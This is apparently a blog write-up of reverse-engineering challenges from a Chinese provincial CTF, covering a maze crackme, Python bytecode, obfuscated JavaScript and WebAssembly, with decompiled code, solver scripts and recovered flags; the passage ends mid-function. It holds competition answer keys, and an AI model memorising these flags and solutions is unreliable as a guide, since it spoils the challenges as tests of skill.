<p>![Untitled](.&#x2F;上海省赛-陕西省赛初赛&#x2F;Untitled 2.png)</p>
<p>找到进入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_40143C()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[<span class="number">100</span>]; // [esp+1Ch] [ebp-74h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v2; // [esp+80h] [ebp-10h]</span><br><span class="line">  <span class="built_in">int</span> v3; // [esp+84h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+88h] [ebp-8h]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+8Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  sub_401B10();</span><br><span class="line">  sub_403F74(aPleaseInputYou);</span><br><span class="line">  sub_403F64(&amp;unk_40605D, v1);</span><br><span class="line">  v2 = sub_403F44(v1);</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( v1[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      case <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">        --v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        ++v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">        --v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">        ++v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401410(v4, v3) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( aS0000000000000[<span class="number">15</span> * v4 + v3] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_403F74(aYouAreRightFla);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_403F6C(aWrong);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经典迷宫</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maze = <span class="string">&quot;****************D000*0000000***0**000*****0***0*00*0*000*0***000**0*0*0*0***0***00*0*0*00**0***0**0*0**0**000*0*00*00*0****0*0******0#****0*00000000***000********0***0***00000*00***0*0*****0**0***0000000*00000****************&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(maze))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        <span class="built_in">print</span>(maze[i*<span class="number">15</span>+j],enR=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">U-w D-s L-a R-d</span><br><span class="line">RRRDRRURRRRRRDDDDRDDD</span><br></pre></td></tr></table></figure>

<p>外面加上flag{md5}就行</p>
<h2 id="babypython"><a href="#babypython" class="headerlink" title="babypython"></a>babypython</h2><p>python字节码，</p>
<p>第一段加密，是对flag每一位异或8</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">968</span> LOAD_CONST             <span class="number">150</span> (<span class="number">8</span>)</span><br><span class="line"><span class="number">970</span> BINARY_OP               <span class="number">12</span> (^)</span><br></pre></td></tr></table></figure>

<p>然后转16进制存入数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">159</span>         <span class="number">990</span> LOAD_NAME               <span class="number">33</span> (value)</span><br><span class="line">            <span class="number">992</span> LOAD_NAME               <span class="number">35</span> (temp)</span><br><span class="line">            <span class="number">994</span> BINARY_OP               <span class="number">13</span> (+=)</span><br><span class="line">            <span class="number">998</span> STORE_NAME              <span class="number">33</span> (value)</span><br><span class="line"></span><br><span class="line"><span class="number">160</span>        <span class="number">1000</span> LOAD_NAME               <span class="number">30</span> (i)</span><br><span class="line">           <span class="number">1002</span> LOAD_CONST             <span class="number">149</span> (<span class="number">1</span>)</span><br><span class="line">           <span class="number">1004</span> BINARY_OP               <span class="number">13</span> (+=)</span><br><span class="line">           <span class="number">1008</span> STORE_NAME              <span class="number">30</span> (i)</span><br></pre></td></tr></table></figure>

<p>下一个加密是+3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1224</span> LOAD_CONST             <span class="number">152</span> (<span class="number">3</span>)</span><br><span class="line"><span class="number">1226</span> BINARY_OP                <span class="number">0</span> (+)</span><br></pre></td></tr></table></figure>

<p>然后后面有个base64，猜测base64加密然后反转。其实有一个替换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1886</span> LOAD_CONST             <span class="number">166</span> (<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">           <span class="number">1888</span> LOAD_CONST             <span class="number">167</span> (<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">           <span class="number">1890</span> PRECALL                  <span class="number">2</span></span><br><span class="line">           <span class="number">1894</span> CALL                     <span class="number">2</span></span><br><span class="line">           <span class="number">1904</span> LOAD_METHOD             <span class="number">50</span> (replace)</span><br><span class="line">           <span class="number">1926</span> LOAD_CONST             <span class="number">168</span> (<span class="string">&#x27;H&#x27;</span>)</span><br><span class="line">           <span class="number">1928</span> LOAD_CONST             <span class="number">169</span> (<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">           <span class="number">1930</span> PRECALL                  <span class="number">2</span></span><br><span class="line">           <span class="number">1934</span> CALL                     <span class="number">2</span></span><br><span class="line">           <span class="number">1944</span> LOAD_METHOD             <span class="number">50</span> (replace)</span><br><span class="line">           <span class="number">1966</span> LOAD_CONST             <span class="number">170</span> (<span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">           <span class="number">1968</span> LOAD_CONST             <span class="number">171</span> (<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">           <span class="number">1970</span> PRECALL                  <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>所以解密先反转base64把3→H,9→W,1→g</p>
<p>![Untitled](.&#x2F;上海省赛-陕西省赛初赛&#x2F;Untitled 3.png)</p>
<p>拿到的结果先减再异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;qglrv@onmlqpA&gt;qmq&gt;mBo3A?Bn&lt;lppA@;lp4nx&quot;</span></span><br><span class="line">p = data[::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(p[i]) -<span class="number">3</span> ) ^ <span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#flag&#123;5dcbafe63fbf3b7d8647c1aee650ae9c&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Badcoffee"><a href="#Badcoffee" class="headerlink" title="Badcoffee"></a>Badcoffee</h2><p>js代码，直接看逻辑就行有混淆，用<a target="_blank" rel="noopener" href="https://deobfuscate.io/">https://deobfuscate.io/</a></p>
<p>逻辑很清晰，flag用数组异或，然后倒过来异或，接下来，再异或，然后对比</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">function _0x3e7b() &#123;</span><br><span class="line">  var _0x293934 = [<span class="string">&quot;8QWULJr&quot;</span>, <span class="string">&quot;414933buASiW&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;uuIPk&quot;</span>, <span class="string">&quot;2hWBkZw&quot;</span>, <span class="string">&quot;50830UgfzNJ&quot;</span>, <span class="string">&quot;search&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;nPakj&quot;</span>, <span class="string">&quot;118810yaFCRd&quot;</span>, <span class="string">&quot;apply&quot;</span>, <span class="string">&quot;YES&quot;</span>, <span class="string">&quot;3279144wTrqht&quot;</span>, <span class="string">&quot;FRwAT&quot;</span>, <span class="string">&quot;204nSqkLC&quot;</span>, <span class="string">&quot;kGYrv&quot;</span>, <span class="string">&quot;XmyuE&quot;</span>, <span class="string">&quot;2810463LgnfkD&quot;</span>, <span class="string">&quot;qGnaj&quot;</span>, <span class="string">&quot;1665531censkz&quot;</span>, <span class="string">&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span>, <span class="string">&quot;1166JQjGyF&quot;</span>, <span class="string">&quot;(((.+)+)+)+$&quot;</span>, <span class="string">&quot;TKKGW&quot;</span>, <span class="string">&quot;charAt&quot;</span>, <span class="string">&quot;constructor&quot;</span>, <span class="string">&quot;5882863UAzTOx&quot;</span>];</span><br><span class="line">  _0x3e7b = function () &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x293934;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> _0x3e7b();</span><br><span class="line">&#125;</span><br><span class="line">function _0x229b(_0x21da69, _0x31c369) &#123;</span><br><span class="line">  var _0x1d6e59 = _0x3e7b();</span><br><span class="line">  <span class="keyword">return</span> _0x229b = function (_0x52956b, _0x1581c3) &#123;</span><br><span class="line">    _0x52956b = _0x52956b - <span class="number">307</span>;</span><br><span class="line">    var _0x62d41 = _0x1d6e59[_0x52956b];</span><br><span class="line">    <span class="keyword">return</span> _0x62d41;</span><br><span class="line">  &#125;, _0x229b(_0x21da69, _0x31c369);</span><br><span class="line">&#125;</span><br><span class="line">(function (_0x5484af, _0x1c1acb) &#123;</span><br><span class="line">  var _0x42b6ee = _0x229b, _0x24c9f0 = _0x5484af();</span><br><span class="line">  <span class="keyword">while</span> (true) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      var _0x2b3ed9 = parseInt(_0x42b6ee(<span class="number">307</span>)) / <span class="number">1</span> * (parseInt(_0x42b6ee(<span class="number">310</span>)) / <span class="number">2</span>) + parseInt(_0x42b6ee(<span class="number">323</span>)) / <span class="number">3</span> + parseInt(_0x42b6ee(<span class="number">318</span>)) / <span class="number">4</span> + -parseInt(_0x42b6ee(<span class="number">311</span>)) / <span class="number">5</span> * (-parseInt(_0x42b6ee(<span class="number">320</span>)) / <span class="number">6</span>) + parseInt(_0x42b6ee(<span class="number">332</span>)) / <span class="number">7</span> * (-parseInt(_0x42b6ee(<span class="number">333</span>)) / <span class="number">8</span>) + parseInt(_0x42b6ee(<span class="number">325</span>)) / <span class="number">9</span> + parseInt(_0x42b6ee(<span class="number">315</span>)) / <span class="number">10</span> * (-parseInt(_0x42b6ee(<span class="number">327</span>)) / <span class="number">11</span>);</span><br><span class="line">      <span class="keyword">if</span> (_0x2b3ed9 === _0x1c1acb) <span class="keyword">break</span>; <span class="keyword">else</span> _0x24c9f0.push(_0x24c9f0.shift());</span><br><span class="line">    &#125; catch (_0x52aa75) &#123;</span><br><span class="line">      _0x24c9f0.push(_0x24c9f0.shift());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;(_0x3e7b, <span class="number">602448</span>));</span><br><span class="line">function xxx(_0x53b7bb, _0x590286) &#123;</span><br><span class="line">  var _0xafde9a = _0x229b, _0x324e3a = &#123;&#125;;</span><br><span class="line">  _0x324e3a[_0xafde9a(<span class="number">314</span>)] = function (_0x318579, _0x2c8042) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x318579 ^ _0x2c8042;</span><br><span class="line">  &#125;;</span><br><span class="line">  var _0x3ba534 = _0x324e3a;</span><br><span class="line">  <span class="keyword">return</span> _0x3ba534.nPakj(_0x53b7bb, _0x590286);</span><br><span class="line">&#125;</span><br><span class="line">function enc(_0x4bda4c) &#123;</span><br><span class="line">  var _0x137834 = _0x229b, _0x3aaed1 = &#123;XmyuE: function (_0x57b977, _0x20fa18, _0x570bf6) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x57b977(_0x20fa18, _0x570bf6);</span><br><span class="line">  &#125;&#125;, _0x8ff1dd = [], _0x6aca75 = [<span class="number">233</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">238</span>, <span class="number">145</span>, <span class="number">144</span>, <span class="number">11</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">134</span>, <span class="number">243</span>, <span class="number">158</span>, <span class="number">197</span>, <span class="number">216</span>, <span class="number">111</span>, <span class="number">136</span>, <span class="number">152</span>, <span class="number">29</span>, <span class="number">204</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">228</span>, <span class="number">39</span>, <span class="number">148</span>, <span class="number">215</span>, <span class="number">220</span>, <span class="number">90</span>, <span class="number">76</span>, <span class="number">251</span>, <span class="number">57</span>, <span class="number">183</span>, <span class="number">184</span>, <span class="number">150</span>, <span class="number">157</span>, <span class="number">156</span>, <span class="number">176</span>, <span class="number">13</span>, <span class="number">41</span>, <span class="number">30</span>, <span class="number">86</span>, <span class="number">244</span>, <span class="number">8</span>];</span><br><span class="line">  console.log(_0x6aca75);</span><br><span class="line">  <span class="keyword">for</span> (let _0x7bc200 = <span class="number">0</span>; _0x7bc200 &lt; <span class="number">42</span>; _0x7bc200++) &#123;</span><br><span class="line">    _0x8ff1dd[_0x7bc200] = _0x3aaed1[_0x137834(<span class="number">322</span>)](xxx, _0x6aca75.at(_0x7bc200), _0x4bda4c[_0x137834(<span class="number">330</span>)](_0x7bc200).charCodeAt());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (let _0x4f674a = <span class="number">0</span>; _0x4f674a &lt; <span class="number">42</span>; _0x4f674a++) &#123;</span><br><span class="line">    _0x8ff1dd[_0x4f674a] = xxx(_0x8ff1dd.at(_0x4f674a), _0x6aca75.at(<span class="number">41</span> - _0x4f674a));</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(_0x8ff1dd);</span><br><span class="line">  <span class="keyword">return</span> _0x8ff1dd;</span><br><span class="line">&#125;</span><br><span class="line">function fff() &#123;</span><br><span class="line">  var _0x47409d = _0x229b, _0x45e04c = &#123;uuIPk: _0x47409d(<span class="number">328</span>), qGnaj: function (_0x5bc07b, _0x400faa, _0x441f85) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x5bc07b(_0x400faa, _0x441f85);</span><br><span class="line">  &#125;, BnVXl: function (_0x189883) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x189883();</span><br><span class="line">  &#125;, dhkyF: _0x47409d(<span class="number">326</span>), FRwAT: function (_0x3ab36f, _0x124b7f) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x3ab36f(_0x124b7f);</span><br><span class="line">  &#125;, kGYrv: function (_0x127f5c, _0x4a909c) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x127f5c &lt; _0x4a909c;</span><br><span class="line">  &#125;, MrEod: function (_0x3d6620, _0x297ded) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x3d6620 != _0x297ded;</span><br><span class="line">  &#125;, arYUV: <span class="string">&quot;Error&quot;</span>, TKKGW: _0x47409d(<span class="number">317</span>)&#125;, _0x5a5ca7 = function () &#123;</span><br><span class="line">    var _0x201045 = true;</span><br><span class="line">    <span class="keyword">return</span> function (_0x69fca7, _0x2b8ad0) &#123;</span><br><span class="line">      var _0x5c3c95 = _0x201045 ? function () &#123;</span><br><span class="line">        var _0x579f2d = _0x229b;</span><br><span class="line">        <span class="keyword">if</span> (_0x2b8ad0) &#123;</span><br><span class="line">          var _0xd4d9a8 = _0x2b8ad0[_0x579f2d(<span class="number">316</span>)](_0x69fca7, arguments);</span><br><span class="line">          <span class="keyword">return</span> _0x2b8ad0 = null, _0xd4d9a8;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; : function () &#123;&#125;;</span><br><span class="line">      <span class="keyword">return</span> _0x201045 = false, _0x5c3c95;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;(), _0x59c26e = _0x45e04c[_0x47409d(<span class="number">324</span>)](_0x5a5ca7, this, function () &#123;</span><br><span class="line">    var _0x25f3ae = _0x47409d;</span><br><span class="line">    <span class="keyword">return</span> _0x59c26e.toString()[_0x25f3ae(<span class="number">312</span>)](_0x45e04c.uuIPk)[_0x25f3ae(<span class="number">313</span>)]()[_0x25f3ae(<span class="number">331</span>)](_0x59c26e)[_0x25f3ae(<span class="number">312</span>)](_0x45e04c[_0x25f3ae(<span class="number">309</span>)]);</span><br><span class="line">  &#125;);</span><br><span class="line">  _0x45e04c.BnVXl(_0x59c26e);</span><br><span class="line">  var _0xe4960c = _0x45e04c.dhkyF, _0x55dae6 = _0x45e04c[_0x47409d(<span class="number">319</span>)](enc, _0xe4960c), _0xbb5ecd = [<span class="number">135</span>, <span class="number">25</span>, <span class="number">72</span>, <span class="number">151</span>, <span class="number">195</span>, <span class="number">212</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">250</span>, <span class="number">101</span>, <span class="number">39</span>, <span class="number">77</span>, <span class="number">163</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">167</span>, <span class="number">119</span>, <span class="number">184</span>, <span class="number">7</span>, <span class="number">77</span>, <span class="number">144</span>, <span class="number">154</span>, <span class="number">93</span>, <span class="number">10</span>, <span class="number">185</span>, <span class="number">48</span>, <span class="number">179</span>, <span class="number">77</span>, <span class="number">71</span>, <span class="number">163</span>, <span class="number">67</span>, <span class="number">61</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">196</span>, <span class="number">136</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">128</span>, <span class="number">93</span>, <span class="number">84</span>, <span class="number">156</span>];</span><br><span class="line">  console.log(_0xbb5ecd);</span><br><span class="line">  <span class="keyword">for</span> (let _0x37df9d = <span class="number">0</span>; _0x45e04c[_0x47409d(<span class="number">321</span>)](_0x37df9d, <span class="number">42</span>); _0x37df9d++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_0x45e04c.MrEod(_0x55dae6.at(_0x37df9d), _0xbb5ecd.at(_0x37df9d))) &#123;</span><br><span class="line">      console[_0x47409d(<span class="number">308</span>)](_0x45e04c.arYUV);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  console[_0x47409d(<span class="number">308</span>)](_0x45e04c[_0x47409d(<span class="number">329</span>)]);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">fff();</span><br></pre></td></tr></table></figure>

<p>下面是脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a= [</span><br><span class="line">  <span class="number">233</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">238</span>, <span class="number">145</span>, <span class="number">144</span>,  <span class="number">11</span>,  <span class="number">43</span>,  <span class="number">87</span>,</span><br><span class="line">  <span class="number">134</span>, <span class="number">243</span>, <span class="number">158</span>, <span class="number">197</span>, <span class="number">216</span>, <span class="number">111</span>, <span class="number">136</span>, <span class="number">152</span>,  <span class="number">29</span>,</span><br><span class="line">  <span class="number">204</span>,  <span class="number">31</span>,  <span class="number">26</span>, <span class="number">228</span>,  <span class="number">39</span>, <span class="number">148</span>, <span class="number">215</span>, <span class="number">220</span>,  <span class="number">90</span>,</span><br><span class="line">   <span class="number">76</span>, <span class="number">251</span>,  <span class="number">57</span>, <span class="number">183</span>, <span class="number">184</span>, <span class="number">150</span>, <span class="number">157</span>, <span class="number">156</span>, <span class="number">176</span>,</span><br><span class="line">   <span class="number">13</span>,  <span class="number">41</span>,  <span class="number">30</span>,  <span class="number">86</span>, <span class="number">244</span>,   <span class="number">8</span></span><br><span class="line">]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">b = [</span><br><span class="line">  <span class="number">135</span>,  <span class="number">25</span>,  <span class="number">72</span>, <span class="number">151</span>, <span class="number">195</span>, <span class="number">212</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">250</span>,</span><br><span class="line">  <span class="number">101</span>,  <span class="number">39</span>,  <span class="number">77</span>, <span class="number">163</span>,  <span class="number">77</span>,  <span class="number">70</span>, <span class="number">167</span>, <span class="number">119</span>, <span class="number">184</span>,</span><br><span class="line">    <span class="number">7</span>,  <span class="number">77</span>, <span class="number">144</span>, <span class="number">154</span>,  <span class="number">93</span>,  <span class="number">10</span>, <span class="number">185</span>,  <span class="number">48</span>, <span class="number">179</span>,</span><br><span class="line">   <span class="number">77</span>,  <span class="number">71</span>, <span class="number">163</span>,  <span class="number">67</span>,  <span class="number">61</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">196</span>, <span class="number">136</span>,</span><br><span class="line">  <span class="number">239</span>, <span class="number">241</span>, <span class="number">128</span>,  <span class="number">93</span>,  <span class="number">84</span>, <span class="number">156</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(b[i] ^ a[<span class="number">41</span>-i] ^ a[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;I_c0uld_neu3r_undeRstand_jvaVs3rIpt!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-amp-Assembly"><a href="#Web-amp-Assembly" class="headerlink" title="Web&amp;Assembly"></a><strong>Web&amp;Assembly</strong></h2><p>wasm不好看，但是鸡爪的插件可以很好的看wasm</p>
<p><img src="/2023/06/05/%E4%B8%8A%E6%B5%B7%E7%9C%81%E8%B5%9B-%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/22.png"></p>
<p><img src="/2023/06/05/%E4%B8%8A%E6%B5%B7%E7%9C%81%E8%B5%9B-%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/11.png"></p>
<p>check是重点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">uint check(char *some,char *<span class="built_in">input</span>,<span class="built_in">int</span> <span class="built_in">hash</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">bool</span> bVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  size_t sVar3;</span><br><span class="line">  <span class="built_in">int</span> l;</span><br><span class="line">  <span class="built_in">int</span> k;</span><br><span class="line">  <span class="built_in">int</span> j;</span><br><span class="line">  undefined8 array;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined8 local_50;</span><br><span class="line">  undefined8 local_48;</span><br><span class="line">  uint i;</span><br><span class="line">  uint flag;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  char local_20;</span><br><span class="line">  <span class="built_in">int</span> local_10;</span><br><span class="line">  char *input_str;</span><br><span class="line">  char *local_8;</span><br><span class="line">  uint local_4;</span><br><span class="line">  </span><br><span class="line">  local_20 = s_0123456789abcdef_ram_00010000[<span class="number">16</span>];</span><br><span class="line">  local_28 = s_0123456789abcdef_ram_00010000._8_8_;</span><br><span class="line">  local_30 = s_0123456789abcdef_ram_00010000._0_8_;</span><br><span class="line">  local_10 = <span class="built_in">hash</span>;</span><br><span class="line">  input_str = <span class="built_in">input</span>;</span><br><span 